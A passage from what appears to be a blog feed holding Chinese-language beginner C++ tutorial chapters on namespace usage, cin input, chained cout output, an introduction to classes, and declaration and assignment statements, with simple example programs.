class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; <span class="comment">// using 指令只在 func1 内部有效</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from func1\n&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cin</span>; <span class="comment">// using 声明只引入 cin</span></span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>;</span><br><span class="line">    <span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Input in func2: &quot;</span> &lt;&lt; x &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 在 main 中也需要访问 std</span></span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line">    func1();</span><br><span class="line">    func2();</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Back in main.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li> <strong>在所有函数定义之前（通常是在所有 <code>#include</code> 之后）放置一个 <code>using namespace std;</code> 指令:</strong> 这使得文件中的所有后续代码都可以直接使用 <code>std</code> 中的名称，无需 <code>std::</code> 前缀。<strong>这种方式最简单，但在大型项目中或编写头文件时不推荐，因为它可能引入全局命名冲突。</strong> 对于学习和小型项目，这通常是可接受的。</li></ol><p><strong>用法与示例 (全局 using 指令):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 将 using 指令放在所有函数之外</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数原型</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_sqrt</span><span class="params">(<span class="keyword">double</span> val)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get_input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> number = get_input(); <span class="comment">// 直接使用 get_input</span></span><br><span class="line">    print_sqrt(number);         <span class="comment">// 直接使用 print_sqrt</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Program finished.&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 直接使用 cout 和 endl</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_sqrt</span><span class="params">(<span class="keyword">double</span> val)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (val &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Cannot calculate square root of a negative number.&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">double</span> root = <span class="built_in">sqrt</span>(val); <span class="comment">// 直接使用 sqrt (来自 cmath, 已在 std 中)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The square root of &quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; root &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">get_input</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> input_val;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter a number: &quot;</span>; <span class="comment">// 直接使用 cout</span></span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; input_val;          <span class="comment">// 直接使用 cin</span></span><br><span class="line">    <span class="keyword">return</span> input_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>选择哪种方式取决于项目的规模和个人/团队的编码规范。对于初学者编写的简单多函数程序，将 <code>using namespace std;</code> 放在 <code>#include</code> 之后是一种常见的简化方法。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.3 其他C++语句</title>
      <link href="2025/04/26/2.3_%E5%85%B6%E4%BB%96C++%E8%AF%AD%E5%8F%A5/"/>
      <url>2025/04/26/2.3_%E5%85%B6%E4%BB%96C++%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p>本节将介绍更多C++语句，包括如何从用户那里获取输入，如何更灵活地使用 <code>cout</code>，并对C++的核心概念——类进行初步介绍。</p><h2 id="2-3-1-使用cin"><a href="#2-3-1-使用cin" class="headerlink" title="2.3.1 使用cin"></a>2.3.1 使用cin</h2><p>与 <code>cout</code> 用于输出类似，<code>cin</code> 是 <code>iostream</code> 库中预定义的一个对象，代表标准输入流，通常连接到键盘。我们可以使用 <code>cin</code> 来读取用户输入的数据。</p><p><code>&gt;&gt;</code> 运算符（提取运算符）用于从 <code>cin</code> 对象获取数据，并将其存储到变量中。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 必须包含 iostream 以使用 cin 和 cout</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> carrots; <span class="comment">// 声明一个整型变量来存储输入</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;How many carrots do you have?&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 提示用户输入</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; carrots; <span class="comment">// 从键盘读取一个整数，并存储到 carrots 变量中</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Here are two more. &quot;</span>;</span><br><span class="line">    carrots = carrots + <span class="number">2</span>; <span class="comment">// 对变量进行操作</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出结果</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now you have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 读取其他类型的数据</span></span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the price per carrot: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; price; <span class="comment">// 读取一个浮点数</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The total cost for &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots is: &quot;</span> </span><br><span class="line">              &lt;&lt; carrots * price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>#include &lt;iostream&gt;</code>: 使用 <code>cin</code> 同样需要包含此头文件。</li><li>  <code>std::cin</code>: <code>cin</code> 对象也位于 <code>std</code> 名称空间中。</li><li>  <code>cin &gt;&gt; variable;</code>: 提取运算符 <code>&gt;&gt;</code> 从输入流（键盘）中读取数据，并根据 <code>variable</code> 的类型进行解释，然后将值存入 <code>variable</code>。<code>cin</code> 也会根据读取的数据类型自动进行转换。</li><li>  <strong>输入分隔:</strong> <code>cin</code> 通常使用空白（空格、制表符、换行符）来分隔不同的输入项。例如，如果程序期望读取两个整数 <code>cin &gt;&gt; a &gt;&gt; b;</code>，用户可以输入 <code>10 20</code> 然后按 Enter，或者输入 <code>10</code> 按 Enter 再输入 <code>20</code> 按 Enter。</li></ul><h2 id="2-3-2-使用cout进行拼接"><a href="#2-3-2-使用cout进行拼接" class="headerlink" title="2.3.2 使用cout进行拼接"></a>2.3.2 使用cout进行拼接</h2><p>我们在前面已经看到如何使用 <code>cout</code> 和插入运算符 <code>&lt;&lt;</code> 输出单个值或字符串。<code>cout</code> 的一个便捷之处在于，你可以在一条语句中连续使用 <code>&lt;&lt;</code> 运算符，将多个输出项“拼接”在一起。这称为**链式输出 (Chaining Output)**。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // 包含 string 类型</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">28</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">75.3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 不使用拼接的写法 (多条语句)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Weight: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; weight;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用拼接的写法 (单条语句，更简洁)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name </span><br><span class="line">              &lt;&lt; <span class="string">&quot;, Age: &quot;</span> &lt;&lt; age </span><br><span class="line">              &lt;&lt; <span class="string">&quot;, Weight: &quot;</span> &lt;&lt; weight </span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 拼接不同类型的数据</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In 5 years, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; will be &quot;</span> &lt;&lt; (age + <span class="number">5</span>) &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>cout &lt;&lt; item1 &lt;&lt; item2 &lt;&lt; item3;</code>: <code>cout</code> 对象在处理完第一个 <code>&lt;&lt; item1</code> 后，会返回自身 (<code>cout</code>)，因此可以继续处理下一个 <code>&lt;&lt; item2</code>，以此类推。</li><li>  这种链式调用使得将变量值、字符串字面量和表达式结果组合输出变得非常方便和易读。</li></ul><h2 id="2-3-3-类简介"><a href="#2-3-3-类简介" class="headerlink" title="2.3.3 类简介"></a>2.3.3 类简介</h2><p><strong>类 (Class)</strong> 是C++的核心概念，也是面向对象编程（OOP）的基础。可以把类看作是创建<strong>对象 (Object)</strong> 的蓝图或模板。</p><ul><li>  <strong>封装 (Encapsulation):</strong> 类将<strong>数据（称为成员变量或属性）</strong>和<strong>操作这些数据的函数（称为成员函数或方法）</strong>捆绑在一起。</li><li>  <strong>抽象 (Abstraction):</strong> 类提供了一个接口（通过其公有成员函数），隐藏了内部实现的复杂细节。</li></ul><p>我们已经在使用类的对象了！<code>cout</code> 和 <code>cin</code> 就是 C++ 标准库中定义的类的对象：</p><ul><li>  <code>cout</code> 是 <code>ostream</code> 类（输出流类）的一个对象。</li><li>  <code>cin</code> 是 <code>istream</code> 类（输入流类）的一个对象。</li></ul><p><code>ostream</code> 类定义了如何处理输出，包括 <code>&lt;&lt;</code> 运算符如何针对不同数据类型工作。<code>istream</code> 类定义了如何处理输入，包括 <code>&gt;&gt;</code> 运算符如何读取数据。</p><p><strong>概念理解:</strong></p><p>想象一下 “汽车” 这个<strong>类</strong>：</p><ul><li>  <strong>数据/属性 (成员变量):</strong> 颜色、品牌、型号、当前速度、油量等。</li><li>  <strong>操作/行为 (成员函数):</strong> 启动()、加速()、刹车()、鸣笛()、获取当前速度() 等。</li></ul><p>根据这个 “汽车” 类，我们可以创建具体的<strong>对象</strong>，比如 “我的蓝色丰田卡罗拉” 或 “邻居的红色法拉利”。每个对象都有自己的属性值（不同的颜色、品牌等），但它们都共享类定义的行为（都可以启动、加速、刹车）。</p><p><strong>示例 (概念性，非完整代码):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这是一个非常简化的概念展示，不是完整的 C++ 类定义</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>: <span class="comment">// 公有接口，外部可以访问</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">startEngine</span><span class="params">()</span></span>; <span class="comment">// 成员函数声明</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">accelerate</span><span class="params">(<span class="keyword">int</span> amount)</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">displayInfo</span><span class="params">()</span></span>; </span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span>: <span class="comment">// 私有数据，外部不能直接访问，只能通过成员函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> color;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> brand;</span><br><span class="line">    <span class="keyword">int</span> currentSpeed;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ... 在程序的其他地方 ...</span></span><br><span class="line"><span class="comment">// Car myCar; // 创建一个 Car 类的对象 (需要构造函数等，此处省略)</span></span><br><span class="line"><span class="comment">// myCar.startEngine(); // 调用对象的成员函数</span></span><br><span class="line"><span class="comment">// myCar.accelerate(50);</span></span><br><span class="line"><span class="comment">// myCar.displayInfo(); </span></span><br></pre></td></tr></table></figure><p>在后续章节中，我们将深入学习如何定义和使用自己的类。目前，只需理解类是定义数据和相关操作的一种方式，而对象是类的具体实例，<code>cout</code> 和 <code>cin</code> 就是我们已经接触到的对象实例。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2.2 C++语句</title>
      <link href="2025/04/26/2.2_C++%E8%AF%AD%E5%8F%A5/"/>
      <url>2025/04/26/2.2_C++%E8%AF%AD%E5%8F%A5/</url>
      
        <content type="html"><![CDATA[<p>C++程序由一系列语句组成。语句是C++程序的基本执行单元，通常以分号 <code>;</code> 结尾。本节将介绍两种基本的语句：声明语句和赋值语句，并进一步探讨 <code>cout</code> 的用法。</p><h2 id="2-2-1-声明语句和变量"><a href="#2-2-1-声明语句和变量" class="headerlink" title="2.2.1 声明语句和变量"></a>2.2.1 声明语句和变量</h2><p><strong>声明语句 (Declaration Statement)</strong> 用于向编译器声明程序中将要使用的<strong>变量 (Variable)</strong> 的名称和类型。</p><p><strong>变量</strong> 是计算机内存中用于存储数据的一块区域，并且有一个名字（标识符）。通过变量名，我们可以访问和修改存储在内存中的数据。在使用变量之前，必须先声明它。</p><p><strong>声明变量的语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeName variableName; </span><br></pre></td></tr></table></figure><ul><li>  <code>typeName</code>: 指定变量要存储的数据类型（例如 <code>int</code> 表示整数，<code>double</code> 表示浮点数）。</li><li>  <code>variableName</code>: 你为变量选择的名称（标识符）。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明一个名为 carrots 的整型变量</span></span><br><span class="line">    <span class="keyword">int</span> carrots; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明多个同类型的变量</span></span><br><span class="line">    <span class="keyword">int</span> dogs, cats; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明并同时初始化变量 (赋初值)</span></span><br><span class="line">    <span class="keyword">int</span> fleas = <span class="number">10</span>; </span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 列表初始化 (更推荐)</span></span><br><span class="line">    <span class="keyword">int</span> hamsters = &#123;<span class="number">5</span>&#125;; </span><br><span class="line">    <span class="keyword">int</span> gerbils&#123;<span class="number">8</span>&#125;; <span class="comment">// 花括号可以省略等号</span></span><br><span class="line">    <span class="keyword">int</span> rats&#123;&#125;;     <span class="comment">// 初始化为 0</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... 后续可以使用这些变量 ...</span></span><br><span class="line"></span><br><span class="line">    carrots = <span class="number">25</span>; <span class="comment">// 赋值</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fleas: &quot;</span> &lt;&lt; fleas &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hamsters: &quot;</span> &lt;&lt; hamsters &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rats: &quot;</span> &lt;&lt; rats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>声明 (Declaration):</strong> 告诉编译器变量的名称和类型。</li><li>  <strong>定义 (Definition):</strong> 声明通常也是定义，因为它会为变量分配内存空间。</li><li>  <strong>初始化 (Initialization):</strong> 在声明变量的同时给它赋一个初始值。这是一个好习惯，可以避免使用未定义的值。</li></ul><h2 id="2-2-2-赋值语句"><a href="#2-2-2-赋值语句" class="headerlink" title="2.2.2 赋值语句"></a>2.2.2 赋值语句</h2><p><strong>赋值语句 (Assignment Statement)</strong> 用于将一个值赋给一个变量。它使用赋值运算符 <code>=</code>。</p><p><strong>语法:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variableName = value;</span><br></pre></td></tr></table></figure><ul><li>  <code>variableName</code>: 要接收值的变量的名称（必须是已声明的变量）。</li><li>  <code>value</code>: 要赋给变量的值。这可以是一个字面常量（如 <code>25</code>）、另一个变量、或一个表达式的结果。</li></ul><p><strong>重要概念:</strong></p><ul><li>  赋值操作是将<strong>右侧</strong>的值复制到<strong>左侧</strong>的变量中。</li><li>  左侧必须是一个可修改的**左值 (lvalue)**，通常就是一个变量名。</li><li>  右侧可以是一个**右值 (rvalue)**，即一个可以产生值的表达式。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> carrots; <span class="comment">// 声明变量</span></span><br><span class="line">    </span><br><span class="line">    carrots = <span class="number">25</span>; <span class="comment">// 赋值语句：将 25 赋给 carrots</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    carrots = carrots - <span class="number">1</span>; <span class="comment">// 赋值语句：将表达式 carrots - 1 的结果 (24) 赋给 carrots</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Crunch, crunch. Now I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> dogs = <span class="number">5</span>; <span class="comment">// 声明并初始化</span></span><br><span class="line">    <span class="keyword">int</span> cats;     <span class="comment">// 声明</span></span><br><span class="line">    </span><br><span class="line">    cats = dogs;  <span class="comment">// 赋值语句：将 dogs 的值 (5) 赋给 cats</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dogs: &quot;</span> &lt;&lt; dogs &lt;&lt; <span class="string">&quot;, Cats: &quot;</span> &lt;&lt; cats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以链式赋值 (从右向左执行)</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c;</span><br><span class="line">    a = b = c = <span class="number">10</span>; <span class="comment">// c=10, 然后 b=c (即 b=10), 然后 a=b (即 a=10)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-2-3-cout的新花样"><a href="#2-2-3-cout的新花样" class="headerlink" title="2.2.3 cout的新花样"></a>2.2.3 cout的新花样</h2><p>我们在 2.1.6 节已经学习了如何使用 <code>cout</code> 输出字符串和使用 <code>endl</code> 换行。<code>cout</code> 的一个强大之处在于它的“智能”，它可以识别并正确显示多种不同类型的数据。</p><p><code>cout</code> 对象与插入运算符 <code>&lt;&lt;</code> 结合使用，可以自动处理 C++ 的内置数据类型，如整数 (<code>int</code>)、浮点数 (<code>double</code>, <code>float</code>)、字符 (<code>char</code>) 以及 C 风格字符串和 